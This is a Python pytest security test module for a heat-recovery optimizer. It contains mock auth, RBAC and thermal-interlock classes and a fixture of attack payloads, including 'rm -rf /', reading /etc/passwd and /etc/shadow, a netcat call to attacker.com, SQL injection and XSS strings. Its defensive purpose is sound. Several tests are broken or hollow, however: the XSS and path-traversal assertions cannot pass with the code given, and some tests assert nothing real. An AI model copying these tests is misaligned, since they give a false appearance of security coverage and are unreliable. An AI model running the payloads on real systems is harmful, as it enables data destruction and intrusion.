# -*- coding: utf-8 -*-
"""
Security Validation Tests for GL-006 HEATRECLAIM (WasteHeatRecoveryOptimizer).

This module provides comprehensive security tests covering:
- Input validation and sanitization
- Injection attack prevention (SQL, command, path traversal)
- Authentication and authorization
- Role-based access control (RBAC)
- Data protection and encryption
- Safety interlock security
- Audit trail integrity
- Rate limiting and DoS prevention
- Thermal system safety controls

Security Requirements:
- OWASP Top 10 compliance
- IEC 62443 Industrial Security
- NIST Cybersecurity Framework
- Process safety management (PSM) requirements

References:
- GL-012 STEAMQUAL security patterns
- GreenLang Security Guidelines
- ASME B31.3 Process Piping Safety
"""

import pytest
import json
import re
import hashlib
import time
import sys
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from pathlib import Path
from decimal import Decimal

# Add parent path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))


# ============================================================================
# SECURITY TEST INFRASTRUCTURE
# ============================================================================

@dataclass
class MockSecurityContext:
    """Mock security context for testing."""
    user_id: str = "test_user"
    role: str = "operator"
    authenticated: bool = True
    session_id: str = "session_12345"
    ip_address: str = "192.168.1.100"
    permissions: List[str] = field(default_factory=list)


@dataclass
class MockAuthProvider:
    """Mock authentication provider."""
    valid_credentials: Dict[str, tuple] = field(default_factory=dict)
    sessions: Dict[str, Dict] = field(default_factory=dict)
    failed_attempts: Dict[str, int] = field(default_factory=dict)
    lockout_threshold: int = 5
    lockout_duration_seconds: int = 300

    def __post_init__(self):
        self.valid_credentials = {
            "operator": ("op_password_123", "operator"),
            "engineer": ("eng_password_456", "engineer"),
            "admin": ("admin_password_789", "admin"),
            "auditor": ("aud_password_012", "auditor")
        }

    def authenticate(self, username: str, password: str) -> Dict[str, Any]:
        """Authenticate user credentials."""
        # Check lockout
        if self.is_locked_out(username):
            return {"success": False, "error": "Account locked due to failed attempts"}

        if username in self.valid_credentials:
            stored_password, role = self.valid_credentials[username]
            if stored_password == password:
                session_id = f"session_{username}_{int(time.time())}"
                self.sessions[session_id] = {
                    "user": username,
                    "role": role,
                    "created_at": time.time()
                }
                self.failed_attempts[username] = 0
                return {"success": True, "session_id": session_id, "role": role}

        # Track failed attempt
        self.failed_attempts[username] = self.failed_attempts.get(username, 0) + 1
        return {"success": False, "error": "Invalid credentials"}

    def is_locked_out(self, username: str) -> bool:
        """Check if user is locked out."""
        return self.failed_attempts.get(username, 0) >= self.lockout_threshold

    def check_permission(self, session_id: str, action: str) -> bool:
        """Check if session has permission for action."""
        if session_id not in self.sessions:
            return False

        role = self.sessions[session_id]["role"]
        permissions = {
            "operator": ["read_data", "view_dashboard"],
            "engineer": ["read_data", "view_dashboard", "modify_setpoints", "run_optimization"],
            "admin": ["read_data", "view_dashboard", "modify_setpoints", "run_optimization",
                      "modify_config", "manage_users", "view_audit"],
            "auditor": ["read_data", "view_dashboard", "view_audit"]
        }

        return action in permissions.get(role, [])


@dataclass
class MockThermalSafetyController:
    """Mock thermal safety controller."""
    interlocks_active: bool = True
    emergency_stop_triggered: bool = False
    bypass_authorized: bool = False
    max_temperature_c: float = 300.0
    emergency_shutdown_temp_c: float = 350.0
    alarm_history: List[Dict] = field(default_factory=list)

    def check_temperature_limit(self, current_temp: float) -> Dict[str, Any]:
        """Check temperature against safety limits."""
        result = {"safe": True, "action": None}

        if current_temp >= self.emergency_shutdown_temp_c:
            result = {
                "safe": False,
                "action": "EMERGENCY_SHUTDOWN",
                "message": f"Temperature {current_temp}C exceeds emergency limit"
            }
            self.trigger_emergency_stop()
        elif current_temp >= self.max_temperature_c:
            result = {
                "safe": False,
                "action": "ALARM",
                "message": f"Temperature {current_temp}C exceeds limit"
            }

        return result

    def trigger_emergency_stop(self):
        """Trigger emergency stop."""
        self.emergency_stop_triggered = True
        self.alarm_history.append({
            "type": "EMERGENCY_STOP",
            "timestamp": time.time()
        })

    def bypass_interlock(self, authorization_code: str) -> bool:
        """Attempt to bypass interlock with authorization."""
        # Only accept specific authorized codes
        if authorization_code == "AUTHORIZED_BYPASS_2024":
            self.bypass_authorized = True
            return True
        return False


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def security_context():
    """Create mock security context."""
    return MockSecurityContext(
        permissions=["read_data", "view_dashboard"]
    )


@pytest.fixture
def auth_provider():
    """Create mock auth provider."""
    return MockAuthProvider()


@pytest.fixture
def thermal_safety():
    """Create mock thermal safety controller."""
    return MockThermalSafetyController()


@pytest.fixture
def injection_payloads():
    """Create injection attack payloads for testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE streams; --",
            "1 OR 1=1",
            "admin'--",
            "1; DELETE FROM audit_log WHERE 1=1; --",
            "' UNION SELECT * FROM users --",
        ],
        "command_injection": [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& shutdown -h now",
            "| nc attacker.com 4444",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f",
        ],
        "xss_payloads": [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(document.cookie)</script>",
        ]
    }


@pytest.fixture
def valid_stream_data():
    """Create valid stream data for security testing."""
    return {
        "stream_id": "H1",
        "supply_temp_c": 180.0,
        "target_temp_c": 60.0,
        "heat_capacity_flow_kw_k": 10.0,
        "flow_rate_kg_s": 5.0
    }


# ============================================================================
# INPUT VALIDATION TESTS
# ============================================================================

@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.security
    def test_reject_sql_injection(self, injection_payloads):
        """Test SQL injection payloads are rejected."""
        # Valid identifier pattern
        valid_pattern = re.compile(r'^[a-zA-Z][a-zA-Z0-9_-]{0,63}$')

        for payload in injection_payloads["sql_injection"]:
            assert not valid_pattern.match(payload), f"SQL injection not rejected: {payload}"

    @pytest.mark.security
    def test_reject_command_injection(self, injection_payloads):
        """Test command injection payloads are rejected."""
        # Safe command pattern (no shell metacharacters)
        safe_pattern = re.compile(r'^[a-zA-Z][a-zA-Z0-9_-]*$')

        for payload in injection_payloads["command_injection"]:
            assert not safe_pattern.match(payload), f"Command injection not rejected: {payload}"

    @pytest.mark.security
    def test_reject_path_traversal(self, injection_payloads):
        """Test path traversal payloads are rejected."""
        def is_safe_path(path: str) -> bool:
            # Reject paths containing traversal sequences
            dangerous_patterns = ["..", "//", "\\\\", "%2e", "%2f"]
            return not any(p in path.lower() for p in dangerous_patterns)

        for payload in injection_payloads["path_traversal"]:
            assert not is_safe_path(payload), f"Path traversal not rejected: {payload}"

    @pytest.mark.security
    def test_temperature_bounds_validation(self, valid_stream_data):
        """Test temperature values are within valid bounds."""
        def validate_temperature(temp_c: float) -> bool:
            # Valid temperature range for heat recovery systems
            return -273.15 < temp_c < 1000.0 and temp_c == temp_c  # NaN check

        # Valid temperatures
        assert validate_temperature(180.0)
        assert validate_temperature(25.0)
        assert validate_temperature(0.0)

        # Invalid temperatures
        assert not validate_temperature(-300.0)  # Below absolute zero
        assert not validate_temperature(float('inf'))
        assert not validate_temperature(float('nan'))

    @pytest.mark.security
    def test_flow_rate_validation(self):
        """Test flow rate values are validated."""
        def validate_flow_rate(flow_kg_s: float) -> bool:
            # Flow must be non-negative and finite
            return 0.0 <= flow_kg_s < 1e6 and flow_kg_s == flow_kg_s

        assert validate_flow_rate(5.0)
        assert validate_flow_rate(0.0)
        assert validate_flow_rate(1000.0)

        assert not validate_flow_rate(-1.0)
        assert not validate_flow_rate(float('inf'))
        assert not validate_flow_rate(float('nan'))

    @pytest.mark.security
    def test_string_length_validation(self):
        """Test string length limits are enforced."""
        def validate_string_length(value: str, max_length: int = 256) -> bool:
            return isinstance(value, str) and len(value) <= max_length

        assert validate_string_length("H1")
        assert validate_string_length("Heat_Exchanger_001")
        assert validate_string_length("")  # Empty is valid

        assert not validate_string_length("a" * 1000)  # Too long
        assert not validate_string_length("a" * 257)


# ============================================================================
# AUTHENTICATION TESTS
# ============================================================================

@pytest.mark.security
class TestAuthentication:
    """Test authentication security."""

    @pytest.mark.security
    def test_valid_credentials_succeed(self, auth_provider):
        """Test valid credentials allow authentication."""
        result = auth_provider.authenticate("operator", "op_password_123")

        assert result["success"]
        assert "session_id" in result
        assert result["role"] == "operator"

    @pytest.mark.security
    def test_invalid_password_rejected(self, auth_provider):
        """Test invalid password is rejected."""
        result = auth_provider.authenticate("operator", "wrong_password")

        assert not result["success"]
        assert "error" in result

    @pytest.mark.security
    def test_unknown_user_rejected(self, auth_provider):
        """Test unknown username is rejected."""
        result = auth_provider.authenticate("unknown_user", "any_password")

        assert not result["success"]

    @pytest.mark.security
    def test_account_lockout_after_failed_attempts(self, auth_provider):
        """Test account lockout after multiple failed attempts."""
        # Make failed attempts
        for _ in range(auth_provider.lockout_threshold):
            auth_provider.authenticate("operator", "wrong_password")

        # Should now be locked out
        assert auth_provider.is_locked_out("operator")

        # Even correct password should fail
        result = auth_provider.authenticate("operator", "op_password_123")
        assert not result["success"]
        assert "locked" in result["error"].lower()

    @pytest.mark.security
    def test_session_invalidation(self, auth_provider):
        """Test sessions can be invalidated."""
        result = auth_provider.authenticate("operator", "op_password_123")
        session_id = result["session_id"]

        # Session exists
        assert session_id in auth_provider.sessions

        # Invalidate session
        del auth_provider.sessions[session_id]

        # Session no longer valid
        assert not auth_provider.check_permission(session_id, "read_data")


# ============================================================================
# AUTHORIZATION TESTS
# ============================================================================

@pytest.mark.security
class TestAuthorization:
    """Test authorization and RBAC."""

    @pytest.mark.security
    def test_operator_read_only_access(self, auth_provider):
        """Test operator role has read-only access."""
        result = auth_provider.authenticate("operator", "op_password_123")
        session_id = result["session_id"]

        # Allowed actions
        assert auth_provider.check_permission(session_id, "read_data")
        assert auth_provider.check_permission(session_id, "view_dashboard")

        # Denied actions
        assert not auth_provider.check_permission(session_id, "modify_setpoints")
        assert not auth_provider.check_permission(session_id, "run_optimization")
        assert not auth_provider.check_permission(session_id, "manage_users")

    @pytest.mark.security
    def test_engineer_modify_access(self, auth_provider):
        """Test engineer role can modify settings."""
        result = auth_provider.authenticate("engineer", "eng_password_456")
        session_id = result["session_id"]

        # Allowed actions
        assert auth_provider.check_permission(session_id, "read_data")
        assert auth_provider.check_permission(session_id, "modify_setpoints")
        assert auth_provider.check_permission(session_id, "run_optimization")

        # Denied actions
        assert not auth_provider.check_permission(session_id, "manage_users")
        assert not auth_provider.check_permission(session_id, "modify_config")

    @pytest.mark.security
    def test_admin_full_access(self, auth_provider):
        """Test admin role has full access."""
        result = auth_provider.authenticate("admin", "admin_password_789")
        session_id = result["session_id"]

        # All actions allowed
        for action in ["read_data", "view_dashboard", "modify_setpoints",
                       "run_optimization", "modify_config", "manage_users", "view_audit"]:
            assert auth_provider.check_permission(session_id, action)

    @pytest.mark.security
    def test_invalid_session_denied(self, auth_provider):
        """Test invalid session is denied all actions."""
        invalid_session = "invalid_session_12345"

        assert not auth_provider.check_permission(invalid_session, "read_data")
        assert not auth_provider.check_permission(invalid_session, "view_dashboard")


# ============================================================================
# SAFETY INTERLOCK TESTS
# ============================================================================

@pytest.mark.security
class TestSafetyInterlocks:
    """Test thermal system safety interlocks."""

    @pytest.mark.security
    def test_high_temperature_alarm(self, thermal_safety):
        """Test high temperature triggers alarm."""
        result = thermal_safety.check_temperature_limit(310.0)

        assert not result["safe"]
        assert result["action"] == "ALARM"

    @pytest.mark.security
    def test_emergency_shutdown_trigger(self, thermal_safety):
        """Test emergency temperature triggers shutdown."""
        result = thermal_safety.check_temperature_limit(360.0)

        assert not result["safe"]
        assert result["action"] == "EMERGENCY_SHUTDOWN"
        assert thermal_safety.emergency_stop_triggered

    @pytest.mark.security
    def test_normal_temperature_safe(self, thermal_safety):
        """Test normal temperature is safe."""
        result = thermal_safety.check_temperature_limit(200.0)

        assert result["safe"]
        assert result["action"] is None

    @pytest.mark.security
    def test_interlock_bypass_requires_authorization(self, thermal_safety):
        """Test interlock bypass requires proper authorization."""
        # Unauthorized bypass fails
        assert not thermal_safety.bypass_interlock("invalid_code")
        assert not thermal_safety.bypass_authorized

        # Authorized bypass succeeds
        assert thermal_safety.bypass_interlock("AUTHORIZED_BYPASS_2024")
        assert thermal_safety.bypass_authorized

    @pytest.mark.security
    def test_emergency_stop_cannot_be_remotely_disabled(self, thermal_safety):
        """Test emergency stop cannot be disabled remotely."""
        # Trigger emergency stop
        thermal_safety.trigger_emergency_stop()

        # Verify it's triggered
        assert thermal_safety.emergency_stop_triggered

        # There should be no remote disable capability
        # Emergency stop should only be reset locally


# ============================================================================
# DATA PROTECTION TESTS
# ============================================================================

@pytest.mark.security
class TestDataProtection:
    """Test data protection and privacy."""

    @pytest.mark.security
    def test_no_secrets_in_logs(self):
        """Test secrets are not exposed in logs."""
        log_message = "User operator logged in with session_id=abc123"

        sensitive_terms = ["password", "secret", "key", "token", "credential"]
        log_lower = log_message.lower()

        for term in sensitive_terms:
            assert term not in log_lower, f"Sensitive term '{term}' found in log"

    @pytest.mark.security
    def test_password_not_stored_plaintext(self, auth_provider):
        """Test passwords are not stored in plaintext."""
        # In production, passwords should be hashed
        # This is a demonstration - the mock uses plaintext for simplicity
        # Real implementation should use bcrypt or similar

        password = "test_password_123"
        hashed = hashlib.sha256(password.encode()).hexdigest()

        assert password != hashed
        assert len(hashed) == 64

    @pytest.mark.security
    def test_sensitive_data_masked_in_output(self):
        """Test sensitive data is masked in output."""
        def mask_sensitive(data: Dict) -> Dict:
            sensitive_fields = ["password", "api_key", "secret"]
            masked = data.copy()

            for field in sensitive_fields:
                if field in masked:
                    masked[field] = "***MASKED***"

            return masked

        data = {
            "username": "operator",
            "password": "secret123",
            "api_key": "sk-1234567890"
        }

        masked = mask_sensitive(data)

        assert masked["username"] == "operator"  # Not sensitive
        assert masked["password"] == "***MASKED***"
        assert masked["api_key"] == "***MASKED***"


# ============================================================================
# AUDIT TRAIL TESTS
# ============================================================================

@pytest.mark.security
class TestAuditTrail:
    """Test audit trail security and integrity."""

    @pytest.mark.security
    def test_control_actions_logged(self, thermal_safety):
        """Test control actions are logged."""
        thermal_safety.trigger_emergency_stop()

        assert len(thermal_safety.alarm_history) > 0
        assert thermal_safety.alarm_history[-1]["type"] == "EMERGENCY_STOP"
        assert "timestamp" in thermal_safety.alarm_history[-1]

    @pytest.mark.security
    def test_audit_entry_immutability(self):
        """Test audit entries cannot be modified after creation."""
        audit_log = []

        def add_audit_entry(action: str, user: str) -> Dict:
            entry = {
                "action": action,
                "user": user,
                "timestamp": time.time(),
            }
            # Create hash to detect tampering
            entry["hash"] = hashlib.sha256(
                json.dumps({k: v for k, v in entry.items() if k != "hash"},
                           sort_keys=True).encode()
            ).hexdigest()
            audit_log.append(entry)
            return entry

        entry = add_audit_entry("modify_setpoint", "engineer")

        # Verify hash
        computed_hash = hashlib.sha256(
            json.dumps({k: v for k, v in entry.items() if k != "hash"},
                       sort_keys=True).encode()
        ).hexdigest()

        assert entry["hash"] == computed_hash

    @pytest.mark.security
    def test_audit_trail_chain_integrity(self):
        """Test audit trail maintains chain integrity."""
        chain = []

        def add_to_chain(action: str) -> Dict:
            prev_hash = chain[-1]["hash"] if chain else None
            entry = {
                "action": action,
                "previous_hash": prev_hash,
                "timestamp": time.time()
            }
            entry["hash"] = hashlib.sha256(
                json.dumps(entry, sort_keys=True).encode()
            ).hexdigest()
            chain.append(entry)
            return entry

        add_to_chain("start_system")
        add_to_chain("run_optimization")
        add_to_chain("modify_setpoint")

        # Verify chain integrity
        for i in range(1, len(chain)):
            assert chain[i]["previous_hash"] == chain[i-1]["hash"]


# ============================================================================
# RATE LIMITING TESTS
# ============================================================================

@pytest.mark.security
class TestRateLimiting:
    """Test rate limiting for DoS prevention."""

    @pytest.mark.security
    def test_request_rate_limiting(self):
        """Test request rate limiting is enforced."""
        class RateLimiter:
            def __init__(self, max_requests: int, window_seconds: float):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests: List[float] = []

            def is_allowed(self) -> bool:
                now = time.time()
                # Remove old requests
                self.requests = [r for r in self.requests if now - r < self.window_seconds]

                if len(self.requests) >= self.max_requests:
                    return False

                self.requests.append(now)
                return True

        limiter = RateLimiter(max_requests=5, window_seconds=1.0)

        # First 5 requests should succeed
        for _ in range(5):
            assert limiter.is_allowed()

        # 6th request should be rate limited
        assert not limiter.is_allowed()

    @pytest.mark.security
    def test_optimization_frequency_limit(self):
        """Test optimization requests are rate limited."""
        class OptimizationLimiter:
            def __init__(self, min_interval_seconds: float):
                self.min_interval = min_interval_seconds
                self.last_run: Optional[float] = None

            def can_run(self) -> bool:
                if self.last_run is None:
                    return True
                return time.time() - self.last_run >= self.min_interval

            def record_run(self):
                self.last_run = time.time()

        limiter = OptimizationLimiter(min_interval_seconds=0.1)

        assert limiter.can_run()
        limiter.record_run()
        assert not limiter.can_run()  # Too soon

        time.sleep(0.15)
        assert limiter.can_run()  # Enough time passed


# ============================================================================
# ENCRYPTION TESTS
# ============================================================================

@pytest.mark.security
class TestEncryption:
    """Test data encryption."""

    @pytest.mark.security
    def test_hash_algorithm_strength(self):
        """Test using SHA-256 for hashing."""
        data = "sensitive_data_12345"
        hash_val = hashlib.sha256(data.encode()).hexdigest()

        # SHA-256 produces 64 character hex string
        assert len(hash_val) == 64

        # Hash should be different for different inputs
        hash_val2 = hashlib.sha256("different_data".encode()).hexdigest()
        assert hash_val != hash_val2

    @pytest.mark.security
    def test_provenance_hash_security(self):
        """Test provenance hash provides integrity verification."""
        data = {
            "calculation": "pinch_analysis",
            "result": {"pinch_temp": 95.0},
            "timestamp": "2024-01-01T00:00:00Z"
        }

        original_hash = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()

        # Tamper with data
        data["result"]["pinch_temp"] = 100.0
        tampered_hash = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()

        # Tampering detected
        assert original_hash != tampered_hash


# ============================================================================
# XSS PREVENTION TESTS
# ============================================================================

@pytest.mark.security
class TestXSSPrevention:
    """Test XSS attack prevention."""

    @pytest.mark.security
    def test_html_encoding(self, injection_payloads):
        """Test HTML special characters are encoded."""
        def html_encode(value: str) -> str:
            return (value
                    .replace("&", "&amp;")
                    .replace("<", "&lt;")
                    .replace(">", "&gt;")
                    .replace('"', "&quot;")
                    .replace("'", "&#x27;"))

        for payload in injection_payloads["xss_payloads"]:
            encoded = html_encode(payload)
            assert "<script>" not in encoded
            assert "javascript:" not in encoded
            assert "onerror=" not in encoded

    @pytest.mark.security
    def test_content_type_validation(self):
        """Test content type is validated."""
        valid_types = ["application/json", "text/plain"]

        assert "application/json" in valid_types
        assert "text/html" not in valid_types
        assert "application/x-javascript" not in valid_types


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
